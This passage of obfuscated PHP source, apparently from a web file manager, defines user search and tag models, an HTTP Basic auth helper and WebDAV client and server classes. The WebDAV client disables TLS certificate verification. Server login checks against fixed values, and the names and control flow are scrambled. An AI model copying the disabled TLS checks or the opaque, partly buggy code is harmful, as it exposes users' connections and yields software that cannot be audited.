$_SERVER[Ìó]; $d§×ƒÅ¬ø = $ağ‚æ”ò¸Ê[33]; $C—Åø’§Ê = array(); goto cÚà‹ºĞ–; c¥ó÷æÈÃÚ: $this->_listDataApply($b¨¥»ï•´”[$ağ‚æ”ò¸Ê[350]]); return $b¨¥»ï•´”; goto f·ğ°ß¢Êï; f·ğ°ß¢Êï: } private function _makeOrder($CãøÉÜ‡×ø = '') { goto Bõí³ç‰¨¼; b‹Œ¶¶æ„‘: $Eóİ¤¤Á¯ = Input::get($b™›‡àñ‹[402], $b™›‡àñ‹[7], $b™›‡àñ‹[1400], $A­ÈÊ‘‰ËÆ); $Fî‘¹¾…ù¨ = Input::get($b™›‡àñ‹[403], $b™›‡àñ‹[7], $b™›‡àñ‹[2147], array($b™›‡àñ‹[2147], $b™›‡àñ‹[399])); $Fî‘¹¾…ù¨ = $DÇ†óĞ˜ëë[$Fî‘¹¾…ù¨]; goto cŸà ˆÍñ; Bõí³ç‰¨¼: $b™›‡àñ‹ =& $_SERVER[Ìó]; $A­ÈÊ‘‰ËÆ = array($b™›‡àñ‹[1409], $b™›‡àñ‹[28], $b™›‡àñ‹[2058], $b™›‡àñ‹[2031], $b™›‡àñ‹[183]); $DÇ†óĞ˜ëë = array($b™›‡àñ‹[397] => $b™›‡àñ‹[398], $b™›‡àñ‹[399] => $b™›‡àñ‹[400]); goto b‹Œ¶¶æ„‘; cŸà ˆÍñ: $CãøÉÜ‡×ø = $CãøÉÜ‡×ø . "\x75\163\145\162\x2e{$Eóİ¤¤Á¯}\x20{$Fî‘¹¾…ù¨}\x2c\40\165\163\x65\162\x2e\x75\x73\x65\162\x49\104\x20\x61\163\143"; return $this->alias($b™›‡àñ‹[2233])->order($CãøÉÜ‡×ø); goto eÛÉÓ¶Å·í; eÛÉÓ¶Å·í: } public function listSearch($D­°ÖöŒİÏ) { goto f¿ÆõŞó§; dÈßÜ¶Ï¡Ş: if (!$b¿Ğ„—õí) { $BñšÂ÷ÒÛŒ = array(); } if (isset($D­°ÖöŒİÏ[$AÛÈÎÜ—òä[685]])) { $BñšÂ÷ÒÛŒ[$AÛÈÎÜ—òä[685]] = $D­°ÖöŒİÏ[$AÛÈÎÜ—òä[685]]; } $d†¹ƒ”‹‚é = $this->_makeOrder()->where($BñšÂ÷ÒÛŒ)->selectPage(20); goto C‰ê‡³¦±‡; Cø•–ˆÂî: return $d†¹ƒ”‹‚é; goto DºÈöœ½¿â; C‰ê‡³¦±‡: if (!$d†¹ƒ”‹‚é || count($d†¹ƒ”‹‚é[$AÛÈÎÜ—òä[350]]) < 5 && Input::check($b¿Ğ„—õí, $AÛÈÎÜ—òä[302])) { $BŞˆ´³Ä„Ğ = $this->_searchFromMeta($AÛÈÎÜ—òä[410], $b¿Ğ„—õí, 10); $aß¼¬–®Œ = $this->_searchFromMeta($AÛÈÎÜ—òä[411], $b¿Ğ„—õí, 10); $Fâ¨Ğ±—‰² = array_merge($BŞˆ´³Ä„Ğ, $aß¼¬–®Œ, $d†¹ƒ”‹‚é[$AÛÈÎÜ—òä[350]]); $d†¹ƒ”‹‚é[$AÛÈÎÜ—òä[350]] = array_unique_by_key($Fâ¨Ğ±—‰², $AÛÈÎÜ—òä[1409]); $d†¹ƒ”‹‚é[$AÛÈÎÜ—òä[347]][$AÛÈÎÜ—òä[348]] = count($d†¹ƒ”‹‚é[$AÛÈÎÜ—òä[350]]); $d†¹ƒ”‹‚é[$AÛÈÎÜ—òä[347]][$AÛÈÎÜ—òä[349]] = ceil($d†¹ƒ”‹‚é[$AÛÈÎÜ—òä[347]][$AÛÈÎÜ—òä[348]] / $d†¹ƒ”‹‚é[$AÛÈÎÜ—òä[347]][$AÛÈÎÜ—òä[345]]); } $this->_listDataApply($d†¹ƒ”‹‚é[$AÛÈÎÜ—òä[350]]); $this->_filterByGroup($d†¹ƒ”‹‚é, $dˆ¤…È¼…š); goto Cø•–ˆÂî; b ‚·ˆ¹Ä: $b¿Ğ„—õí = str_replace($AÛÈÎÜ—òä[2150], $AÛÈÎÜ—òä[2151], trim($b¿Ğ„—õí)); $BñšÂ÷ÒÛŒ = array($AÛÈÎÜ—òä[28] => array($AÛÈÎÜ—òä[747], "\x25{$b¿Ğ„—õí}\x25"), $AÛÈÎÜ—òä[289] => array($AÛÈÎÜ—òä[747], "\x25{$b¿Ğ„—õí}\45"), $AÛÈÎÜ—òä[2292] => array($AÛÈÎÜ—òä[747], "\45{$b¿Ğ„—õí}\45"), $AÛÈÎÜ—òä[912] => $AÛÈÎÜ—òä[2152]); if (Input::check($b¿Ğ„—õí, $AÛÈÎÜ—òä[295])) { $BñšÂ÷ÒÛŒ[$AÛÈÎÜ—òä[1409]] = array($AÛÈÎÜ—òä[747], "\x25{$b¿Ğ„—õí}\x25"); $BñšÂ÷ÒÛŒ[$AÛÈÎÜ—òä[2472]] = array($AÛÈÎÜ—òä[747], "\x25{$b¿Ğ„—õí}\45"); } goto dÈßÜ¶Ï¡Ş; f¿ÆõŞó§: $AÛÈÎÜ—òä =& $_SERVER[Ìó]; $b¿Ğ„—õí = $D­°ÖöŒİÏ[$AÛÈÎÜ—òä[2148]]; $dˆ¤…È¼…š = isset($D­°ÖöŒİÏ[$AÛÈÎÜ—òä[2149]]) ? $D­°ÖöŒİÏ[$AÛÈÎÜ—òä[2149]] : !1; goto b ‚·ˆ¹Ä; DºÈöœ½¿â: } private function _filterByGroup(&$f÷¬À¹êÍ‡, $DŒš‰ò¶ê) { $C”¤©ç·­ =& $_SERVER[Ìó]; if (!$DŒš‰ò¶ê) { return $f÷¬À¹êÍ‡; } foreach ($f÷¬À¹êÍ‡[$C”¤©ç·­[350]] as $DÊ¨Ä‰ƒ—Å => &$Có…ƒğ¯…) { $E¾¢¶›×Çó = array_to_keyvalue($Có…ƒğ¯…[$C”¤©ç·­[2493]], $C”¤©ç·­[33], $C”¤©ç·­[2072]); if (!in_array($DŒš‰ò¶ê, $E¾¢¶›×Çó)) { unset($f÷¬À¹êÍ‡[$C”¤©ç·­[350]][$DÊ¨Ä‰ƒ—Å]); } } $f÷¬À¹êÍ‡[$C”¤©ç·­[350]] = array_values($f÷¬À¹êÍ‡[$C”¤©ç·­[350]]); $f÷¬À¹êÍ‡[$C”¤©ç·­[347]] = array($C”¤©ç·­[2267] => count($f÷¬À¹êÍ‡[$C”¤©ç·­[350]]), $C”¤©ç·­[2265] => $f÷¬À¹êÍ‡[$C”¤©ç·­[347]][$C”¤©ç·­[345]], $C”¤©ç·­[2264] => 1, $C”¤©ç·­[2266] => 1); } private function _searchFromMeta($f¢—š®ø¯, $Dó½Ôîô…›, $D‡ä½“†ÇÏ) { goto EÓŸˆã¥¹–; EŠµöÛ«Ÿ†: $Eä–ãÌí™ = Model($dêŠ®Ü¹ã[2494])->where($bë¹™äÍ…Ñ)->limit($D‡ä½“†ÇÏ)->select(); if (!$Eä–ãÌí™) { return array(); } $Eä–ãÌí™ = array_to_keyvalue($Eä–ãÌí™, $dêŠ®Ü¹ã[33], $dêŠ®Ü¹ã[1409]); goto a©ØŠ¦›ÕÕ; EÓŸˆã¥¹–: $dêŠ®Ü¹ã =& $_SERVER[Ìó]; $Dó½Ôîô…› = strtolower($Dó½Ôîô…›); $bë¹™äÍ…Ñ = array($dêŠ®Ü¹ã[89] => $f¢—š®ø¯, $dêŠ®Ü¹ã[355] => array($dêŠ®Ü¹ã[747], "\45{$Dó½Ôîô…›}\x25")); goto EŠµöÛ«Ÿ†; a©ØŠ¦›ÕÕ: $Fó—àÖÊŞ” = $this->where(array($dêŠ®Ü¹ã[1400] => array($dêŠ®Ü¹ã[7], $Eä–ãÌí™)))->select(); if (!$Fó—àÖÊŞ”) { return array(); } return $Fó—àÖÊŞ”; goto e²ÛÚÓ°¿Ú; e²ÛÚÓ°¿Ú: } private function _listDataApplyItem($A¥ÃÀĞ¾®) { $FØµÍñ¡Ä = array($A¥ÃÀĞ¾®); $this->_listDataApply($FØµÍñ¡Ä); return $FØµÍñ¡Ä[0]; } private function _listDataApply(&$DéØŒÉÈ‘¯) { goto CÊØÎÕëó; b‰ñ¾â–”Ş: $bìä­’â¢¬ = array_to_keyvalue($DéØŒÉÈ‘¯, $cÎ‹‚ñ‚µ¥[33], $cÎ‹‚ñ‚µ¥[1409]); $this->_listAppendGroup($DéØŒÉÈ‘¯, $bìä­’â¢¬); $this->_listAppendMeta($DéØŒÉÈ‘¯, $bìä­’â¢¬); goto f‘Ä¯ ê¬ƒ; f‘Ä¯ ê¬ƒ: $this->_listAppendSourceRoot($DéØŒÉÈ‘¯, $bìä­’â¢¬); goto Eåù ®‰†Â; CÊØÎÕëó: $cÎ‹‚ñ‚µ¥ =& $_SERVER[Ìó]; if (!$DéØŒÉÈ‘¯) { return; } array_remove_key($DéØŒÉÈ‘¯, $cÎ‹‚ñ‚µ¥[800]); goto b‰ñ¾â–”Ş; Eåù ®‰†Â: } private function _listAppendSourceRoot(&$dÉÂø—™œ§, $a«ÃÔ¡‡‰Š) { goto B«’ƒíÜ‚; DÉ›¬§¿¹‚: $D­‹öôÂ¬ = Model($a„Â·÷ƒ’[748])->order($a„Â·÷ƒ’[2159])->field($Bù¼Åâóº–)->where($FÜÊÇ—¿¤Û)->select(); $D­‹öôÂ¬ = array_to_keyvalue($D­‹öôÂ¬, $a„Â·÷ƒ’[451]); $D­‹öôÂ¬ = array_remove_key($D­‹öôÂ¬, $a„Â·÷ƒ’[451]); goto cÁÄ¾ëŠ¤³; B«’ƒíÜ‚: $a„Â·÷ƒ’ =& $_SERVER[Ìó]; $FÜÊÇ—¿¤Û = array($a„Â·÷ƒ’[456] => 0, $a„Â·÷ƒ’[367] => SourceModel::TYPE_USER, $a„Â·÷ƒ’[451] => array($a„Â·÷ƒ’[7], $a«ÃÔ¡‡‰Š)); $Bù¼Åâóº– = $a„Â·÷ƒ’[2158]; goto DÉ›¬§¿¹‚; cÁÄ¾ëŠ¤³: foreach ($dÉÂø—™œ§ as &$BÇÍºëçŒ–) { $BÇÍºëçŒ–[$a„Â·÷ƒ’[387]] = $D­‹öôÂ¬[$BÇÍºëçŒ–[$a„Â·÷ƒ’[1409]]] ? $D­‹öôÂ¬[$BÇÍºëçŒ–[$a„Â·÷ƒ’[1409]]] : array(); } goto e†–´‡Êƒ ; e†–´‡Êƒ : } private function _listAppendGroup(&$AËƒù¥Êë, $Fí™›ğÎ¤) { goto f°ØÒÔ†Óè; f°ØÒÔ†Óè: $Fğ­Â«ï’¯ =& $_SERVER[Ìó]; $B¿ŠÉ¦¿– = array($Fğ­Â«ï’¯[1409] => array($Fğ­Â«ï’¯[7], $Fí™›ğÎ¤)); $cùç“é•Æ’ = Model($Fğ­Â«ï’¯[2146])->where($B¿ŠÉ¦¿–)->select(); goto Eôšâ†¨Â; AïÑó¡Ûå: $B¿ŠÉ¦¿– = array($Fğ­Â«ï’¯[2072] => array($Fğ­Â«ï’¯[7], $Aóéã÷‚®)); $B…¨²Ì–Ö = Model($Fğ­Â«ï’¯[2495])->field($Fğ­Â«ï’¯[2496])->where($B¿ŠÉ¦¿–)->select(); $DÀ„Ê·µº = array_to_keyvalue($B…¨²Ì–Ö, $Fğ­Â«ï’¯[2072], $Fğ­Â«ï’¯[28]); goto AÌøŞ¼ßê®; Eôšâ†¨Â: $Aóéã÷‚® = array_to_keyvalue($cùç“é•Æ’, $Fğ­Â«ï’¯[33], $Fğ­Â«ï’¯[2072]); $Aóéã÷‚® = array_remove_value(array_unique($Aóéã÷‚®), $Fğ­Â«ï’¯[463]); if (!$Aóéã÷‚® || !$cùç“é•Æ’) { return; } goto AïÑó¡Ûå; AÌøŞ¼ßê®: $cùç“é•Æ’ = array_to_keyvalue_group($cùç“é•Æ’, $Fğ­Â«ï’¯[1409]); foreach ($cùç“é•Æ’ as &$f‘¥†Üèè) { $cÛ®®¶ˆ = array(); foreach ($f‘¥†Üèè as $AµºšÈÙ) { if (!$AµºšÈÙ[$Fğ­Â«ï’¯[2200]]) { continue; } $bª„§˜½Æ  = Model($Fğ­Â«ï’¯[2219])->listData($AµºšÈÙ[$Fğ­Â«ï’¯[2200]]); $cÛ®®¶ˆ[] = array($Fğ­Â«ï’¯[2072] => $AµºšÈÙ[$Fğ­Â«ï’¯[2072]], $Fğ­Â«ï’¯[2497] => $DÀ„Ê·µº[$AµºšÈÙ[$Fğ­Â«ï’¯[2072]]], $Fğ­Â«ï’¯[372] => $bª„§˜½Æ ); } $f‘¥†Üèè = $cÛ®®¶ˆ; } foreach ($AËƒù¥Êë as &$c¹‡·ÑÎ×­) { $c¹‡·ÑÎ×­[$Fğ­Â«ï’¯[2493]] = array(); if (isset($cùç“é•Æ’[$c¹‡·ÑÎ×­[$Fğ­Â«ï’¯[1409]]])) { $c¹‡·ÑÎ×­[$Fğ­Â«ï’¯[2493]] = $cùç“é•Æ’[$c¹‡·ÑÎ×­[$Fğ­Â«ï’¯[1409]]]; } } goto e»¦”‚ÈŒŠ; e»¦”‚ÈŒŠ: } private function _listAppendMeta(&$cßÅœ¡¯½, $fëËß´¢“Œ) { goto bäÈ’ÒÔÊê; F ˆÊ¸øĞ: $D¤´‚ÃªéŸ = array($bÄêå¡È†‚[1409] => array($bÄêå¡È†‚[7], $fëËß´¢“Œ)); $CÊİßôö§ì = Model($bÄêå¡È†‚[2471])->where($D¤´‚ÃªéŸ)->select(); $CÊİßôö§ì = array_to_keyvalue_group($CÊİßôö§ì, $bÄêå¡È†‚[1409]); goto BËíÂèøÅø; BËíÂèøÅø: foreach ($CÊİßôö§ì as &$DÑŒ¬ˆµÇÍ) { $B°¿äˆµõ… = array(); foreach ($DÑŒ¬ˆµÇÍ as $c–”êÒó) { if (!in_array($c–”êÒó[$bÄêå¡È†‚[89]], $Cô›ÅÎî¿ö)) { $B°¿äˆµõ…[$c–”êÒó[$bÄêå¡È†‚[89]]] = $c–”êÒó[$bÄêå¡È†‚[355]]; } } $DÑŒ¬ˆµÇÍ = $B°¿äˆµõ…; } $D’º¾ç ½… = Model($bÄêå¡È†‚[2498]); foreach ($cßÅœ¡¯½ as &$CÙ¥®™â²Ş) { $EçæŒƒ¬³ = array(); if (isset($CÊİßôö§ì[$CÙ¥®™â²Ş[$bÄêå¡È†‚[1409]]])) { $EçæŒƒ¬³ = $CÊİßôö§ì[$CÙ¥®™â²Ş[$bÄêå¡È†‚[1409]]]; } $CÙ¥®™â²Ş[$bÄêå¡È†‚[2499]] = array(); if (isset($EçæŒƒ¬³[$A›ÛÉØÑË])) { $CÙ¥®™â²Ş[$bÄêå¡È†‚[2499]] = $D’º¾ç ½…->getUserJobInfo($EçæŒƒ¬³[$A›ÛÉØÑË]); } } goto e„Ñ¢×‹Ã; bäÈ’ÒÔÊê: $bÄêå¡È†‚ =& $_SERVER[Ìó]; $A›ÛÉØÑË = UserJobModel::JOB_KEY; $Cô›ÅÎî¿ö = array($bÄêå¡È†‚[2474]); goto F ˆÊ¸øĞ; e„Ñ¢×‹Ã: } public function userSearch($E˜Œ£¦õÈ, $Cœ¼¬™µ‹¤ = "\x2a") { return Model($_SERVER[Ìó][472])->where($E˜Œ£¦õÈ)->field($Cœ¼¬™µ‹¤)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\x72\137\x6f\x70\x74\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($C¬Óœî±¸) { $FçÊ¯ÑˆŒ¸ =& $_SERVER[Ìó]; if (!defined($FçÊ¯ÑˆŒ¸[422])) { define($FçÊ¯ÑˆŒ¸[422], 0); } return "\x55\x73\145\162\117\x70\x74\151\x6f\x6e\137{$C¬Óœî±¸}\x5f" . USER_ID; } protected function filterWhere($dåíÁ ‹½) { $a¬íÜÓ•œ¢ =& $_SERVER[Ìó]; if (!defined($a¬íÜÓ•œ¢[422])) { define($a¬íÜÓ•œ¢[422], 0); } $dåíÁ ‹½[$a¬íÜÓ•œ¢[1409]] = USER_ID; return $dåíÁ ‹½; } public function cacheRemoveUser($EŒ¬¿¯ˆ½, $AÎÂÌ×®¤) { return Cache::remove("\125\163\x65\162\x4f\x70\x74\x69\x6f\156\x5f{$EŒ¬¿¯ˆ½}\x5f" . $AÎÂÌ×®¤); } protected function optionDefault($F´‘òÀ„Òè = '') { $AÕ¹¸äÀ– =& $_SERVER[Ìó]; if ($F´‘òÀ„Òè == $AÕ¹¸äÀ–[33]) { return $GLOBALS[$AÕ¹¸äÀ–[6]][$AÕ¹¸äÀ–[2500]]; } if ($F´‘òÀ„Òè == $AÕ¹¸äÀ–[2501]) { return $GLOBALS[$AÕ¹¸äÀ–[6]][$AÕ¹¸äÀ–[2502]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\x72\x2e\x74\x61\x67\x4c\x69\x73\x74"; public $modelType = "\x55\x73\145\162\117\x70\164\151\157\156"; public $field = array("\156\x61\x6d\145", "\x73\164\x79\154\x65", "\163\157\162\164"); public function listData($aŒù¾ÕŠŠ = false, $FËÒ‚Îï§ = "\x73\x6f\162\164", $c‰÷®öğË‘ = false) { return parent::listData($aŒù¾ÕŠŠ, $FËÒ‚Îï§, $c‰÷®öğË‘); } public function remove($eùÃÕˆÄ–ç) { return parent::remove($eùÃÕˆÄ–ç); } public function add($EïŒïŞÅç, $d‚—ê¿ˆƒà = "\x6c\x61\142\x65\154\x2d\147\162\x65\x79\55\156\157\x72\x6d\141\x6c") { $EÛõ®—‚ô½ =& $_SERVER[Ìó]; if ($this->findByName($EïŒïŞÅç)) { return !1; } $F´¦Ï‚Ä„ = array($EÛõ®—‚ô½[382] => $EïŒïŞÅç, $EÛõ®—‚ô½[432] => $d‚—ê¿ˆƒà, $EÛõ®—‚ô½[2076] => $this->getSort($EÛõ®—‚ô½[242]) + 1); return parent::insert($F´¦Ï‚Ä„); } public function update($d×£„´™š, $b»İ½ˆÍˆÔ) { $Cí´ÃÕØ¨À =& $_SERVER[Ìó]; $cğ…ÁÌ‰–« = $this->listData($d×£„´™š); $EÉ Ğ®Ù„Ä = $this->findByName($b»İ½ˆÍˆÔ[$Cí´ÃÕØ¨À[28]]); if (!$cğ…ÁÌ‰–« || $EÉ Ğ®Ù„Ä && $EÉ Ğ®Ù„Ä[$Cí´ÃÕØ¨À[363]] != $cğ…ÁÌ‰–«[$Cí´ÃÕØ¨À[363]]) { return !1; } return parent::update($d×£„´™š, $b»İ½ˆÍˆÔ); } public function moveTop($eŒ·Í¯í) { $C¢²¶Ô•œŞ =& $_SERVER[Ìó]; $C©êÑÊÒ = parent::listData(); $c…ó˜‘–Ã¤ = $this->getSort($C¢²¶Ô•œŞ[241]); foreach ($C©êÑÊÒ as &$e»…¯µ²”ó) { if ($e»…¯µ²”ó[$C¢²¶Ô•œŞ[363]] == $eŒ·Í¯í) { $e»…¯µ²”ó[$C¢²¶Ô•œŞ[2093]] = $c…ó˜‘–Ã¤; continue; } $e»…¯µ²”ó[$C¢²¶Ô•œŞ[2093]] += 1; } return parent::resetData($C©êÑÊÒ); } public function moveBottom($EŞô›Ÿ) { $bƒƒ÷£ãƒÜ =& $_SERVER[Ìó]; $f¨Ö‹†¬Öó = $this->getSort($bƒƒ÷£ãƒÜ[242]) + 1; return parent::update($EŞô›Ÿ, array($bƒƒ÷£ãƒÜ[2093] => $f¨Ö‹†¬Öó)); } public function resetSort($Fëä»âµ†) { goto b¬è¸…ôÈƒ; b¬è¸…ôÈƒ: $A½ªö¦º =& $_SERVER[Ìó]; $fÆİÉ‹ºØä = array(); $Fëä»âµ† = is_array($Fëä»âµ†) ? $Fëä»âµ† : array(); goto FïÑ¬¼ëƒ; FïÑ¬¼ëƒ: for ($d°Ş±ÎÉ = 0; $d°Ş±ÎÉ < count($Fëä»âµ†); $d°Ş±ÎÉ++) { $fÆİÉ‹ºØä[$Fëä»âµ†[$d°Ş±ÎÉ] . $A½ªö¦º[33]] = $d°Ş±ÎÉ + 1; } $cÇÉ”Èœ = parent::listData(); foreach ($cÇÉ”Èœ as &$a”öİªãâ¢) { $C×æÄØ¤‰ë = $fÆİÉ‹ºØä[$a”öİªãâ¢[$A½ªö¦º[363]]]; $a”öİªãâ¢[$A½ªö¦º[2093]] = $C×æÄØ¤‰ë ? $C×æÄØ¤‰ë : $a”öİªãâ¢[$A½ªö¦º[2093]]; } goto a†ÌÜ£¤ãè; a†ÌÜ£¤ãè: return parent::resetData($cÇÉ”Èœ); goto dãŒ£ÓÉï; dãŒ£ÓÉï: } private function getSort($EÁ ö«òè±) { $f»Ñ«†ø§ =& $_SERVER[Ìó]; $d¨‡± ‡‹ = parent::listData(); $bÖùí´Ë¾ = array_to_keyvalue($d¨‡± ‡‹, $f»Ñ«†ø§[33], $f»Ñ«†ø§[2093]); if (!$bÖùí´Ë¾) { $bÖùí´Ë¾ = array(0); } $eİ²¢ î®÷ = $EÁ ö«òè± == $f»Ñ«†ø§[242] ? max($bÖùí´Ë¾) : min($bÖùí´Ë¾); return intval($eİ²¢ î®÷); } } goto EåëÕó×ç; e²ğ÷¢ÖãÅ: class HttpAuth { public static function get() { $Bš³ó´äçš =& $_SERVER[Ìó]; $F˜ÍÀ’—´Ñ = $Bš³ó´äçš[33]; $BØ´ìÕ¸£é = $Bš³ó´äçš[33]; if (isset($_SERVER[$Bš³ó´äçš[1728]])) { $F˜ÍÀ’—´Ñ = $_SERVER[$Bš³ó´äçš[1728]]; $BØ´ìÕ¸£é = $_SERVER[$Bš³ó´äçš[1729]]; } elseif (isset($_SERVER[$Bš³ó´äçš[1730]])) { $c¿©´¸æË = $_SERVER[$Bš³ó´äçš[1730]]; if (strpos(strtolower($c¿©´¸æË), $Bš³ó´äçš[1731]) === 0) { $D‚ì“Ò™— = explode($Bš³ó´äçš[4], base64_decode(substr($c¿©´¸æË, 6))); $F˜ÍÀ’—´Ñ = isset($D‚ì“Ò™—[0]) ? $D‚ì“Ò™—[0] : $Bš³ó´äçš[33]; $BØ´ìÕ¸£é = isset($D‚ì“Ò™—[1]) ? $D‚ì“Ò™—[1] : 0; } } return array($Bš³ó´äçš[530] => $F˜ÍÀ’—´Ñ, $Bš³ó´äçš[895] => $BØ´ìÕ¸£é); } public static function error() { goto e¸ãˆ›àóÏ; cñêÖ»»é™: die; goto bğä‡Ş™Ó›; FœÉñŠ°²‹: header($b¼‚ï³•Ä•[1734]); header($b¼‚ï³•Ä•[1735]); header($b¼‚ï³•Ä•[1251]); goto cñêÖ»»é™; e¸ãˆ›àóÏ: $b¼‚ï³•Ä• =& $_SERVER[Ìó]; header($b¼‚ï³•Ä•[1732]); header($b¼‚ï³•Ä•[1733]); goto FœÉñŠ°²‹; bğä‡Ş™Ó›: } public static function make($A‘íˆ¸Æä², $d—ğÛ›ºÑ) { $bäÒªÆãš‹ =& $_SERVER[Ìó]; return $bäÒªÆãš‹[1736] + base64_encode($A‘íˆ¸Æä² . $bäÒªÆãš‹[4] . $d—ğÛ›ºÑ); } } class HttpDavClient { public function __construct($DãÙçŒáÀÍ, $AÙÔ™°ä…, $FâËÔ¢Êõ) { $this->header = array(); $this->userName = $AÙÔ™°ä…; $this->userPassowrd = $FâËÔ¢Êõ; } protected function makePath($EÃàğÔÃ¤Ô) { return $EÃàğÔÃ¤Ô; } protected function setHeader($eŠ°è…Å¶ö, $Cè–ÓØÉÛ = false) { if ($Cè–ÓØÉÛ === !1) { $this->header[] = $eŠ°è…Å¶ö; } else { $this->header[] = $eŠ°è…Å¶ö . $_SERVER[Ìó][878] . $Cè–ÓØÉÛ; } } public function move($C¹—è“”º«, $ağôèİ•Š, $Cæã«óï²ƒ = '') { $d–ÅÔÀ‚ =& $_SERVER[Ìó]; $this->setHeader($d–ÅÔÀ‚[1737], $this->makePath($ağôèİ•Š)); $this->setHeader($d–ÅÔÀ‚[1738], $d–ÅÔÀ‚[1739]); if ($Cæã«óï²ƒ) { $this->setHeader($d–ÅÔÀ‚[1740], $d–ÅÔÀ‚[923] . $Cæã«óï²ƒ . $d–ÅÔÀ‚[926]); } return $this->send($d–ÅÔÀ‚[1741], $C¹—è“”º«); } public function copy($dÊª»ïÖÑ, $aï‘¾±Ú‰) { $c­åò’Ö•¼ =& $_SERVER[Ìó]; $this->setHeader($c­åò’Ö•¼[1737], $this->makePath($aï‘¾±Ú‰)); $this->setHeader($c­åò’Ö•¼[1738], $c­åò’Ö•¼[1739]); return $this->send($c­åò’Ö•¼[1742], $dÊª»ïÖÑ); } public function mkcol($D—Ú£²ìòê) { $FÎäãí£—å =& $_SERVER[Ìó]; $this->setHeader($FÎäãí£—å[1738], $FÎäãí£—å[1739]); return $this->send($FÎäãí£—å[1743], $D—Ú£²ìòê); } public function delete($D­³ê‚¥§†, $D‚ŞåˆÏä = '') { $EÍÃ“ÃƒÇ• =& $_SERVER[Ìó]; if ($D‚ŞåˆÏä) { $this->setHeader($EÍÃ“ÃƒÇ•[1740], $EÍÃ“ÃƒÇ•[923] . $D‚ŞåˆÏä . $EÍÃ“ÃƒÇ•[926]); } return $this->send($EÍÃ“ÃƒÇ•[1239], $D­³ê‚¥§†); } public function propfind($cÕ•õËìÖÅ) { $AŠº ¤ÜŞ‰ =& $_SERVER[Ìó]; $this->setHeader($AŠº ¤ÜŞ‰[1744], $AŠº ¤ÜŞ‰[83]); $this->setHeader($AŠº ¤ÜŞ‰[1745], $AŠº ¤ÜŞ‰[1746]); $f¸› ã¤ÇÆ = $AŠº ¤ÜŞ‰[1747]; return $this->send($AŠº ¤ÜŞ‰[1748], $cÕ•õËìÖÅ, $f¸› ã¤ÇÆ); } public function options($B»ÏòÖâ¡Ø) { return $this->send($_SERVER[Ìó][1749], $B»ÏòÖâ¡Ø); } public function get($e‹¤Œïàö¯) { return $this->send($_SERVER[Ìó][212], $e‹¤Œïàö¯); } public function put($cíÖ® ¥ù, $fˆó¥Úˆãâ, $fñå­ÅÂ«ì = '') { $CÚöƒÙÁ‚í =& $_SERVER[Ìó]; if ($fñå­ÅÂ«ì) { $this->setHeader($CÚöƒÙÁ‚í[1740], $CÚöƒÙÁ‚í[923] . $fñå­ÅÂ«ì . $CÚöƒÙÁ‚í[926]); } return $this->send($CÚöƒÙÁ‚í[210], $cíÖ® ¥ù, $fˆó¥Úˆãâ); } protected function send($BÆ“Ë²ÜîÀ, $D­™¤òÔ‡Ö, $F£İ¦ã½«­ = false, $d©øöÇ¬õ = false) { goto Côä…ÜÙ; DÅ…¹¯½ö: $this->header = array(); return $C§×‘‰–‡; goto FÊ¹ÚİìÖ; Aï¬Åñ–˜: $c£â¨Á–ËÄ = curl_init($D­™¤òÔ‡Ö); curl_setopt($c£â¨Á–ËÄ, CURLOPT_CUSTOMREQUEST, $BÆ“Ë²ÜîÀ); curl_setopt($c£â¨Á–ËÄ, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto B²„“…ÁÜÓ; B²„“…ÁÜÓ: curl_setopt($c£â¨Á–ËÄ, CURLOPT_HTTPHEADER, $this->header); curl_setopt($c£â¨Á–ËÄ, CURLOPT_RETURNTRANSFER, !0); curl_setopt($c£â¨Á–ËÄ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto E°‡ùÑ; E°‡ùÑ: curl_setopt($c£â¨Á–ËÄ, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($c£â¨Á–ËÄ, CURLOPT_SSL_VERIFYHOST, !1); $C§×‘‰–‡ = curl_exec($c£â¨Á–ËÄ); goto DÅ…¹¯½ö; Côä…ÜÙ: $B«Ùœ»§¬¬ =& $_SERVER[Ìó]; $FÆùÙ–Ôù… = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($B«Ùœ»§¬¬[1750], $B«Ùœ»§¬¬[50]); goto a¼ñ¥ˆÑó; a¼ñ¥ˆÑó: $this->setHeader($FÆùÙ–Ôù…); if ($F£İ¦ã½«­) { $F£İ¦ã½«­ = $B«Ùœ»§¬¬[1751] . $F£İ¦ã½«­; } if (!request_url_safe($D­™¤òÔ‡Ö)) { return !1; } goto Aï¬Åñ–˜; FÊ¹ÚİìÖ: } } class HttpDavServer { public function __construct($eï‘±†ó¹Ä, $FÈ™îäÓ®½) { $this->root = $eï‘±†ó¹Ä; $this->initPath($FÈ™îäÓ®½); $this->start(); } public function initPath($aµÆŒ›äÂ«) { $D ¶—ô´Øë =& $_SERVER[Ìó]; $A ¹ƒåÓ£Ì = rtrim($_SERVER[$D ¶—ô´Øë[1360]], $D ¶—ô´Øë[8]) . $D ¶—ô´Øë[8]; $this->urlBase = substr($A ¹ƒåÓ£Ì, 0, strpos($A ¹ƒåÓ£Ì, $aµÆŒ›äÂ«) + 1); $this->urlBase = rtrim($this->urlBase, $D ¶—ô´Øë[8]) . $aµÆŒ›äÂ«; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $eˆÌÆâÊÕ =& $_SERVER[Ìó]; $aÑŒé£Äô = HttpAuth::get(); if ($aÑŒé£Äô[$eˆÌÆâÊÕ[530]] == $eˆÌÆâÊÕ[1752] && $aÑŒé£Äô[$eˆÌÆâÊÕ[895]] == $eˆÌÆâÊÕ[1753]) { return !0; } HttpAuth::error(); } public function start() { goto E‡‰·­Ûì; E‡‰·­Ûì: $AÜ«†¥áÀŸ =& $_SERVER[Ìó]; $this->checkUser(); $dªÖà‹’à = $AÜ«†¥áÀŸ[142] . HttpHeader::method(); goto EÆ¥İ¿ØÏÄ; bÍóäèµÈÉ: if (!$AøŒ¹—ÙŠ) { return; } self::response($AøŒ¹—ÙŠ); goto BÀ­¢Øº²Ş; EÆ¥İ¿ØÏÄ: if (!method_exists($this, $dªÖà‹’à)) { pr($dªÖà‹’à . $AÜ«†¥áÀŸ[1754]); die; } $cË¿¼ù£Ìì = array($AÜ«†¥áÀŸ[1755], 